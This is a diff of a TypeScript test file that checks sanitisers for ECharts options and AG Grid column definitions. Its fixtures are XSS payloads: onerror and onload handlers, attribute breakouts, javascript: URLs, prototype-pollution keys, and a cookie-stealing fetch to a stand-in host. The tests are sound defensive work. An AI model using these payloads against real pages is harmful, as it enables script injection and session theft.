@@ -19,7 +19,7 @@
 import { render, waitFor } from 'spec/helpers/testing-library';
 import { MAX_OPTION_DEPTH, resolveBindings } from '../resolveBindings';
 import { sanitizeColumnDefs } from './AgGridTableWidget';
-import { sanitizeEchartsOption } from './echartsSafety';
+import { escapeTooltipTemplate, sanitizeEchartsOption } from './echartsSafety';
 import MarkdownWidget from './MarkdownWidget';
 
 // The real renderer and sanitiser, not the pass-through stand-ins the test
@@ -31,6 +31,10 @@ jest.unmock('rehype-raw');
 const theme = {} as Parameters<typeof resolveBindings>[1]['theme'];
 // Assembled, so the fixture is not itself a script URL in this source file.
 const SCRIPT_URL = `${'java'}${'script'}:alert(1)`;
+
+/** Every tag a browser would open in `text`, were it assigned as HTML. */
+const markupIn = (text: string): string[] =>
+  text.match(/<\/?[a-z][^>]*>/gi) ?? [];
 
 test('a tooltip template keeps its formatting and loses anything that could run', () => {
   const option = {
@@ -58,9 +62,244 @@ test('a tooltip template keeps its formatting and loses anything that could run'
   expect(safe.tooltip.formatter).toContain('<b>{b}</b>: {c}');
   expect(safe.tooltip.trigger).toBe('axis');
   expect(safe.series[0].label.formatter).toBe('<{c}>');
-  expect(serialized).not.toMatch(/onerror|onclick|<script|javascript:/i);
+  // Whatever markup is left is text: no tag other than the inert ones opens.
+  expect(markupIn(serialized)).toEqual(['<b>', '</b>', '</i>']);
+  expect(safe.series[0].tooltip.formatter).toBe(
+    '&lt;a href=&quot;javascript:alert(3)&quot;&gt;{a}&lt;/a&gt;',
+  );
   // The author's object is not what was cleaned.
   expect(option.tooltip.formatter).toContain('onerror');
+});
+
+test('a toolbox keeps only tools that draw nothing into the page', () => {
+  const hostile = '<img src=x onerror=alert(1)>';
+  const safe = sanitizeEchartsOption({
+    toolbox: {
+      show: true,
+      itemSize: 40,
+      left: 'center',
+      top: `0;background:url(https://evil.example/x)`,
+      tooltip: { show: true, formatter: hostile, extraCssText: hostile },
+      iconStyle: { borderColor: hostile },
+      feature: {
+        dataView: {
+          show: true,
+          title: hostile,
+          lang: [hostile, hostile, hostile],
+          optionToContent: 'alert(1)',
+        },
+        myTool: { show: true, title: hostile, icon: hostile, onclick: 'x' },
+        magicType: { type: ['line', 'bar'], option: { line: {} } },
+        saveAsImage: {
+          show: true,
+          type: 'png',
+          title: hostile,
+          lang: [hostile],
+          name: hostile,
+          pixelRatio: 2,
+        },
+        restore: { show: true, title: hostile },
+        dataZoom: {
+          show: true,
+          yAxisIndex: 'none',
+          title: { zoom: hostile, back: hostile },
+        },
+      },
+    },
+    series: [{ type: 'bar' }],
+  });
+
+  expect(safe.toolbox).toEqual({
+    show: true,
+    itemSize: 40,
+    left: 'center',
+    feature: {
+      saveAsImage: { show: true, type: 'png', pixelRatio: 2 },
+      restore: { show: true },
+      dataZoom: { show: true, yAxisIndex: 'none' },
+    },
+  });
+  expect(JSON.stringify(safe)).not.toMatch(/onerror|dataView|myTool|evil/);
+});
+
+test('the security review payload yields no markup', () => {
+  const safe = sanitizeEchartsOption({
+    toolbox: {
+      show: true,
+      itemSize: 40,
+      feature: {
+        dataView: {
+          show: true,
+          lang: [
+            "<img src=x onerror=fetch('https://evil/'+document.cookie)>",
+            'x',
+            'y',
+          ],
+        },
+      },
+    },
+    series: [{ type: 'bar' }],
+  });
+
+  expect(safe.toolbox).toEqual({ show: true, itemSize: 40, feature: {} });
+  expect(markupIn(JSON.stringify(safe))).toEqual([]);
+});
+
+test('a tooltip is rebuilt from known settings, wherever it sits', () => {
+  const breakout = '"><img src=x onerror=alert(1)>';
+  const hostileTooltip = {
+    show: true,
+    trigger: 'item',
+    renderMode: 'html',
+    position: 'top',
+    // Spliced by ECharts into the markup of the tooltip arrow.
+    backgroundColor: breakout,
+    borderColor: `red${breakout}`,
+    shadowColor: 'rgba(0, 0, 0, 0.2)',
+    extraCssText: `background:url(https://evil.example/?${breakout})`,
+    className: 'x" onmouseover="alert(1)',
+    content: '<script>alert(1)</script>',
+    formatterParams: { a: breakout },
+    appendTo: 'body',
+    padding: [4, 8],
+    textStyle: {
+      color: '#333',
+      fontFamily: `x;background:url(//evil.example)`,
+      fontSize: 12,
+      rich: { a: { backgroundColor: { image: 'https://evil.example/a.png' } } },
+    },
+    axisPointer: { type: 'shadow', label: { formatter: '<{value}>' } },
+  };
+  const expected = {
+    show: true,
+    trigger: 'item',
+    renderMode: 'html',
+    position: 'top',
+    shadowColor: 'rgba(0, 0, 0, 0.2)',
+    padding: [4, 8],
+    textStyle: { color: '#333', fontSize: 12 },
+    axisPointer: { type: 'shadow', label: { formatter: '<{value}>' } },
+  };
+
+  const safe = sanitizeEchartsOption({
+    tooltip: hostileTooltip,
+    legend: { tooltip: hostileTooltip },
+    xAxis: [{ type: 'category', tooltip: hostileTooltip }],
+    series: [
+      {
+        type: 'pie',
+        tooltip: [hostileTooltip],
+        data: [{ value: 1, tooltip: hostileTooltip }],
+      },
+    ],
+  });
+
+  expect(safe.tooltip).toEqual(expected);
+  expect(safe.legend.tooltip).toEqual(expected);
+  expect(safe.xAxis[0].tooltip).toEqual(expected);
+  expect(safe.series[0].tooltip).toEqual([expected]);
+  expect(safe.series[0].data[0].tooltip).toEqual(expected);
+  expect(JSON.stringify(safe)).not.toMatch(/onerror|evil|script|onmouseover/);
+});
+
+test('only top-level keys known to draw on the canvas are passed on', () => {
+  const nested = { tooltip: { formatter: '<img src=x onerror=alert(1)>' } };
+  const safe = sanitizeEchartsOption({
+    series: [{ type: 'line' }],
+    xAxis: { type: 'category' },
+    color: ['#111'],
+    // Each of these nests whole options, or is not a component drawn here.
+    baseOption: nested,
+    media: [{ option: nested }],
+    options: [nested],
+    timeline: { data: ['a'] },
+    brush: {},
+    geo: { map: 'world' },
+    somethingNew: { html: '<script>alert(1)</script>' },
+  });
+
+  expect(Object.keys(safe).sort()).toEqual(['color', 'series', 'xAxis']);
+
+  // As JSON delivers it, `__proto__` is an own key at any depth.
+  const parsed = JSON.parse(
+    '{"__proto__": {"polluted": true}, "series": [{"__proto__": {"polluted": true}, "type": "bar"}]}',
+  );
+  const cleaned = sanitizeEchartsOption(parsed);
+  expect(cleaned).toEqual({ series: [{ type: 'bar' }] });
+  expect(
+    (cleaned.series[0] as { polluted?: boolean }).polluted,
+  ).toBeUndefined();
+  expect(({} as { polluted?: boolean }).polluted).toBeUndefined();
+});
+
+test('graphic elements keep their drawing and lose every handler', () => {
+  const fromCode = () => undefined;
+  const safe = sanitizeEchartsOption({
+    graphic: {
+      elements: [
+        {
+          type: 'text',
+          style: { text: '<b>42</b>' },
+          onclick: 'alert(1)',
+          onmouseover: fromCode,
+          ONCLICK: 'alert(2)',
+          children: [{ type: 'rect', ondragstart: fromCode, draggable: true }],
+        },
+      ],
+    },
+    // Outside `graphic` a key that merely starts with "on" is a setting.
+    xAxis: { axisLine: { onZero: false } },
+  });
+
+  expect(safe.graphic).toEqual({
+    elements: [
+      {
+        type: 'text',
+        // Canvas text, drawn as written.
+        style: { text: '<b>42</b>' },
+        children: [{ type: 'rect', draggable: true }],
+      },
+    ],
+  });
+  expect(safe.xAxis).toEqual({ axisLine: { onZero: false } });
+});
+
+test('links on tree nodes follow the same rule as title links', () => {
+  const safe = sanitizeEchartsOption({
+    series: [
+      {
+        type: 'treemap',
+        data: [
+          { name: 'a', value: 1, link: SCRIPT_URL },
+          { name: 'b', value: 2, link: 'https://ok.example/b' },
+          { name: 'c', value: 3, children: [{ name: 'd', link: SCRIPT_URL }] },
+        ],
+      },
+    ],
+    // Not a URL: axis pointers are linked by a list of axis references.
+    axisPointer: { link: [{ xAxisIndex: 'all' }] },
+  });
+
+  expect(safe.series[0].data).toEqual([
+    { name: 'a', value: 1 },
+    { name: 'b', value: 2, link: 'https://ok.example/b' },
+    { name: 'c', value: 3, children: [{ name: 'd' }] },
+  ]);
+  expect(safe.axisPointer).toEqual({ link: [{ xAxisIndex: 'all' }] });
+});
+
+test('a tooltip template is escaped except for attribute-less formatting', () => {
+  expect(escapeTooltipTemplate('{b}: {c} & more')).toBe('{b}: {c} &amp; more');
+  expect(escapeTooltipTemplate('<b>{b}</b><br/>{c}<BR>')).toBe(
+    '<b>{b}</b><br/>{c}<BR>',
+  );
+  expect(escapeTooltipTemplate('<b onclick="x">{b}</b>')).toBe(
+    '&lt;b onclick=&quot;x&quot;&gt;{b}</b>',
+  );
+  expect(escapeTooltipTemplate('<br/onload=x>')).toBe('&lt;br/onload=x&gt;');
+  expect(escapeTooltipTemplate("<svg/onload='x'>")).toBe(
+    '&lt;svg/onload=&#39;x&#39;&gt;',
+  );
 });
 
 test('title links that would run script are dropped, ordinary ones kept', () => {
@@ -87,12 +326,12 @@ test('cleaning an option survives self-references and leaves non-JSON values alo
     tooltip: { formatter },
     series: [{ type: 'line' }],
   };
-  option.self = option;
+  option.dataset = { again: option };
 
   const safe = sanitizeEchartsOption(option);
 
   expect((safe.tooltip as { formatter: unknown }).formatter).toBe(formatter);
-  expect(safe.self).toBeUndefined();
+  expect(safe.dataset).toEqual({});
   expect(safe.series).toEqual([{ type: 'line' }]);
 });
 
@@ -155,6 +394,44 @@ test('authored column definitions keep declarative settings only', () => {
       hide: false,
     },
   ]);
+  expect(
+    sanitizeColumnDefs([
+      {
+        field: 'amount',
+        // Names AG Grid resolves against registries: built-ins only.
+        type: 'evilColumn',
+        cellDataType: 'custom',
+        sort: 'asc',
+        pinned: 'top; drop',
+        filter: 'agTextColumnFilter',
+        // Components and anything handed the DOM or a template.
+        headerComponent: 'x',
+        headerComponentParams: { template: '<img src=x onerror=alert(1)>' },
+        cellRendererSelector: 'x',
+        tooltipComponent: 'x',
+        tooltipField: 'amount',
+        cellEditor: 'x',
+        cellStyle: { background: 'url(https://evil.example)' },
+        cellClass: 'x',
+        children: [{ field: 'nested', valueGetter: 'alert(1)' }],
+        headerTooltip: '<img src=x onerror=alert(1)>',
+      },
+      { field: '__proto__.polluted' },
+      { field: 'a.constructor.prototype' },
+      { field: 'x'.repeat(501) },
+      { field: 'ok', width: Number.POSITIVE_INFINITY, type: 'numericColumn' },
+    ]),
+  ).toEqual([
+    // Text settings stay, as text: AG Grid draws them as text content.
+    {
+      field: 'amount',
+      sort: 'asc',
+      headerTooltip: '<img src=x onerror=alert(1)>',
+    },
+    { field: 'ok', type: 'numericColumn' },
+  ]);
+  const inherited = Object.create({ field: 'inherited', valueGetter: 'x' });
+  expect(sanitizeColumnDefs([inherited])).toEqual([]);
   expect(sanitizeColumnDefs(undefined)).toEqual([]);
   expect(sanitizeColumnDefs({ field: 'x' })).toEqual([]);
 });
